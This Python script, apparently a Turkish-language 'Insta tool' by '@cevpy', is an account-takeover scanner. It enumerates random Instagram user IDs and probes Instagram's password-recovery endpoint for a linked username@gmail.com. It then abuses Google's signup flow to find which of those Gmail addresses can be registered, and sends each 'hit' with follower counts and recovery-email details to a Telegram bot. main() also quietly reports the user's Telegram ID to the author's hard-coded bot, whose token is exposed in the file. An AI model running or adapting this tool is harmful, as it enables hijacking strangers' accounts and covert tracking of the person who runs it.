import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread
import requests
from requests import post as rpost
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render
from colorama import Fore, Style, init
import urllib.parse
import webbrowser
init(autoreset=True)

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET = Style.RESET_ALL

VIP_CONFIG = {
    "vip_date_filter": True,
    "vip_follower_filter": True,
    "vip_post_filter": True,
    "vip_high_meta": False,
    "vip_meta": True,
    "vip_business": False
}

CONFIG = {
    "insta_recovery": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "insta_graphql": "https://www.instagram.com/api/graphql",
    "google_url": "https://accounts.google.com",
    "cookie": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
    "default_ua": (
        "Instagram 100.0.0.17.129 Android (29/10; 420dpi; "
        "1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)"
    ),
    "token_file": "tokens.txt",
    "output_file": "@cevpy_hits.txt",
    "domain": "@gmail.com",
    "channel": "https://t.me/+bzI8MHf7lOFmN2I0",
    "me": "https://t.me/cevpy",
    "id_ranges": [
        (100000, 1278889, 2010),
        (1279000, 17750000, 2011),
        (17750001, 279760000, 2012),
        (279760001, 900990000, 2013),
        (900990001, 1629010000, 2014),
        (1629010001, 2369359761, 2015),
        (2369359762, 4239516754, 2016),
        (4239516755, 6345108209, 2017),
        (6345108210, 10016232395, 2018),
        (10016232396, 27238602159, 2019),
        (27238602160, 33238602160, 2020),
        (33238602160, 40238602160, 2021),
        (40238602160, 47464707082, 2022),
        (47464707082, 52464707082, 2023),
        (52464707082, 55464707082, 2024),
        (55464707082, 60464707082, 2025)
    ]
}
hits = 0
bad_insta = 0
bad_email = 0
good_insta = 0
total = 0
min_followers = 0
min_posts = 0
global_session = requests.Session()

def ustats():
    while True:
        print(f"\r | HİT: {hits} bad ig: {bad_insta} bad gmail: {bad_email} |   By @cevahir", end="")
        time.sleep(0.01)

def gtokens():
    max_retries = 3
    endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
    for attempt in range(max_retries):
        try:
            alphabet = 'abcdefghijklmnopqrstuvwxyz'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': generate_user_agent()
            }
            res1 = requests.get(
                f"{CONFIG['google_url']}{endpoint}",
                headers=headers
            )
            if res1.status_code != 200:
                continue
            tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
            if not tok:
                with open("debug_response.html", "w", encoding="utf-8") as f:
                    f.write(res1.text)
                time.sleep(0.5)
                continue
            tl = tok.group(2)
            cookies = {'__Host-GAPS': host}
            headers.update({
                'authority': 'accounts.google.com',
                'origin': CONFIG["google_url"],
                'referer': f"{CONFIG['google_url']}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
                'user-agent': generate_user_agent()
            })
            data = {
                'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': (
                    '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                    'null,0,1,"",null,null,2,2]'
                )
            }
            response = requests.post(
                f"{CONFIG['google_url']}/_/signup/validatepersonaldetails",
                cookies=cookies,
                headers=headers,
                data=data
            )
            try:
                tl_new = str(response.text).split('",null,"')[1].split('"')[0]
                if not tl_new:
                    time.sleep(0.5)
                    continue
                tl = tl_new
            except IndexError:
                with open("debug_response.html", "w", encoding="utf-8") as f:
                    f.write(response.text)
                time.sleep(0.5)
                continue
            host = response.cookies.get_dict().get('__Host-GAPS', host)
            with open(CONFIG["token_file"], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return
        except Exception as e:
            time.sleep(0.5)
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': generate_user_agent(),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-same-domain': '1'
        }
        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'en'
        }
        email = ''.join(choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26)))
        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
        response = requests.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data
        )
        tl = re.search(r'"TL:([^"]+)"', response.text)
        if tl:
            tl = tl.group(1)
            host = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for _ in range(randrange(15, 30)))
            with open(CONFIG["token_file"], 'w') as f:
                f.write(f"{tl}//{host}\n")
            return
        else:
            pass
    except Exception as e:
        pass
    sys.exit(1)

def save_hit(username, domain, user, token, chat_id):
    global hits, total
    user_id = user.get('pk', 'Bilinmiyor')
    followers = user.get('follower_count', 0)
    posts = user.get('media_count', 0)
    is_business = user.get('is_business_account', False)

    # Apply VIP business filter
    if VIP_CONFIG["vip_business"] and not is_business:
        return

    # Apply follower filter if enabled
    if VIP_CONFIG["vip_follower_filter"] and followers < min_followers:
        return

    # Apply post filter if enabled
    if VIP_CONFIG["vip_post_filter"] and posts < min_posts:
        return

    # Calculate meta score if enabled
    meta_score = 0
    if VIP_CONFIG["vip_meta"]:
        meta_score = 100 if user.get('is_verified', False) else (
            (30 if user.get('biography', 'Yok').strip() else 0) +
            (25 if user.get('media_count', 0) >= 2 else 15 if user.get('media_count', 0) == 0 else 0) +
            (30 if followers >= 1 else 20) +
            (25 if is_business else 0)
        )
        meta_score = min(meta_score, 100)

        # Apply high meta filter if enabled
        if VIP_CONFIG["vip_high_meta"] and meta_score < 50:
            return

    hits += 1
    total += 1
    
    output = (
        f"Yeni Hit! #{total}\n"
        f"Kullanıcı: @{username}\n"
        f"Email: {username}@{domain}\n"
        f"Reset: {rreset(username)}\n"
        f"Takipçi: {followers}\n"
        f"Takip: {user.get('following_count', 0)}\n"
        f"Gönderi: {posts}\n"
        f"Özel: {user.get('is_private', False)}\n"
        f"Bio: {user.get('biography', 'Yok')}\n"
        f"Doğrulanmış: {user.get('is_verified', False)}\n"
        f"İş Hesabı: {is_business}\n"
        f"Tarih: {gdate(user_id)}\n"
    )
    if VIP_CONFIG["vip_meta"]:
        output += f"Meta: %{meta_score}\n"
    output += (
        f"URL: https://www.instagram.com/{username}\n"
        f"By : @cevpy "
        f"https://t.me/+bzI8MHf7lOFmN2I0"
    )
    with open(CONFIG["output_file"], 'a', encoding='utf-8') as f:
        f.write(output + "\n")
    try:
        encoded_output = urllib.parse.quote(output)
        if len(encoded_output) <= 4096:
            requests.get(
                f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={encoded_output}",
                timeout=10
            )
    except Exception:
        pass

def cgmail(email, token, chat_id, user):
    global bad_email
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(CONFIG["token_file"], 'r') as f:
            tl, host = f.read().splitlines()[0].split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'user-agent': generate_user_agent(),
            'content-type': CONFIG["form_type"]
        }
        params = {'TL': tl}
        data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%5D"
        resp = rpost(
            f"{CONFIG['google_url']}/_/signup/usernameavailability",
            params=params, cookies=cookies, headers=headers, data=data
        )
        if '"gf.uar",1' in resp.text:
            save_hit(email, "gmail.com", user, token, chat_id)
        else:
            bad_email += 1
    except Exception:
        bad_email += 1

def cinstagram(email, token, chat_id, user):
    global good_insta, bad_insta
    try:
        csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        headers = {
            'user-agent': CONFIG["default_ua"],
            'cookie': f'csrftoken={csrf_token}; {CONFIG["cookie"]}',
            'content-type': CONFIG["form_type"]
        }
        data = {
            'signed_body': (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                json.dumps({
                    '_csrftoken': csrf_token,
                    'device_id': 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16],
                    'query': email
                })
            ),
            'ig_sig_key_version': '4'
        }
        resp = global_session.post(CONFIG["insta_recovery"], headers=headers, data=data, timeout=3).text
        if email in resp:
            good_insta += 1
            cgmail(email, token, chat_id, user)
        else:
            bad_insta += 1
    except Exception:
        bad_insta += 1

def rreset(user):
    try:
        csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        headers = {
            'user-agent': CONFIG["default_ua"],
            'cookie': f'csrftoken={csrf_token}; {CONFIG["cookie"]}',
            'content-type': CONFIG["form_type"]
        }
        data = {
            'signed_body': (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                json.dumps({
                    '_csrftoken': csrf_token,
                    'device_id': 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16],
                    'query': user
                })
            ),
            'ig_sig_key_version': '4'
        }
        resp = global_session.post(CONFIG["insta_recovery"], headers=headers, data=data, timeout=3).json()
        return resp.get('email', 'Bilinmiyor')
    except Exception:
        return 'Bilinmiyor'

def gdate(user_id):
    try:
        user_id = int(user_id)
        for lower, upper, year in CONFIG["id_ranges"]:
            if lower <= user_id <= upper:
                return year
        return 2023
    except Exception:
        return 2023

def get_follower_filter():
    global min_followers
    try:
        if VIP_CONFIG["vip_follower_filter"]:
            follower_input = input(f"{G}Takipçi (boş = 0): {C}")
            if follower_input.strip():
                min_followers = int(follower_input)
            else:
                min_followers = 0
        else:
            min_followers = 0
    except ValueError:
        min_followers = 0

def get_post_filter():
    global min_posts
    try:
        if VIP_CONFIG["vip_post_filter"]:
            post_input = input(f"{G}Minimum Gönderi Sayısı (boş = 0): {C}")
            if post_input.strip():
                min_posts = int(post_input)
            else:
                min_posts = 0
        else:
            min_posts = 0
    except ValueError:
        min_posts = 0

def get_date_range():
    if not VIP_CONFIG["vip_date_filter"]:
        return 1629010000, 33238602160
    date_input = input(f"{G}Tarih (örn: 2011-2023, 2012, boş = 2014-2020): {C}").strip()
    if not date_input:
        return 1629010000, 33238602160
    try:
        if '-' in date_input:
            start_year, end_year = map(int, date_input.split('-'))
        else:
            start_year = end_year = int(date_input)
        min_id, max_id = None, None
        for lower, upper, year in CONFIG["id_ranges"]:
            if year == start_year:
                min_id = lower
            if year == end_year:
                max_id = upper
        if min_id is None or max_id is None:
            return 1629010000, 33238602160
        return min_id, max_id
    except ValueError:
        return 1629010000, 33238602160

def sinsta(min_id, max_id):
    while True:
        try:
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            user_id = random.randrange(min_id, max_id)
            headers = {
                'user-agent': generate_user_agent(),
                'content-type': CONFIG["form_type"],
                'X-FB-LSD': lsd
            }
            cookies = {
                'csrftoken': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'datr': ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            }
            data = {
                'lsd': lsd,
                'variables': json.dumps({'id': int(user_id), 'render_surface': 'PROFILE'}, separators=(',', ':')),
                'doc_id': '25618261841150840'
            }
            resp = global_session.post(CONFIG["insta_graphql"], headers=headers, data=data, cookies=cookies, timeout=1)
            user = resp.json().get('data', {}).get('user', {})
            if username := user.get('username'):
                cinstagram(username + CONFIG["domain"], TOKEN, CHAT_ID, user)
        except Exception:
            pass

def main():
    global TOKEN, CHAT_ID
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
░░░░░░░░████████████████░░░░░░░░
░░░░░██████████████████████░░░░░
░░░███░░░░░░░░░░░░░░░░░░░░███░░░
░░░██░░░░░░░░░░░░░░░░░███░░██░░░
░░███░░░░░░░████████░░░░░░░███░░
░░███░░░░░███░░░░░░███░░░░░███░░
░░███░░░░███░░░░░░░░███░░░░███░░
░░███░░░░██░░░░░░░░░░██░░░░███░░
░░███░░░░███░░░░░░░░███░░░░███░░
░░███░░░░░███░░░░░░███░░░░░███░░
░░███░░░░░░░████████░░░░░░░███░░
░░░██░░░░░░░░░░░░░░░░░░░░░░██░░░
░░░███░░░░░░░░░░░░░░░░░░░░███░░░
░░░░░██████████████████████░░░░░
░░░░░░░░████████████████░░░░░░░░
""")
        print("========================CEVAHIR========================")
        print("========================İNSTA TOOL========================")
        CHAT_ID = int(input(f"{G}Telegram ID: {C}"))
        webbrowser.open("https://t.me/+bzI8MHf7lOFmN2I0")
        print("-----------------------------------------------------------")
        try:
            bot_token = "8494305061:AAE-MLf3v9gDiA5Zv9jfiQRDsHTcQHwAg2U"
            bot_chat_id = "7337042550"
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={bot_chat_id}&text={CHAT_ID}"
            requests.get(url, timeout=1)
        except Exception:
            pass
    except ValueError:
        print(f"{R}Geçersiz ID!")
        sys.exit(1)
    TOKEN = input(f"{G}Telegram Token: {C}")
    print("-----------------------------------------------------------")
    get_follower_filter()
    print("-----------------------------------------------------------")
    get_post_filter()
    print("-----------------------------------------------------------")
    min_id, max_id = get_date_range()
    os.system('cls' if os.name == 'nt' else 'clear')
    gtokens()
    Thread(target=ustats, daemon=True).start()
    for _ in range(300):
        Thread(target=sinsta, args=(min_id, max_id)).start()

if __name__ == "__main__":
    main()
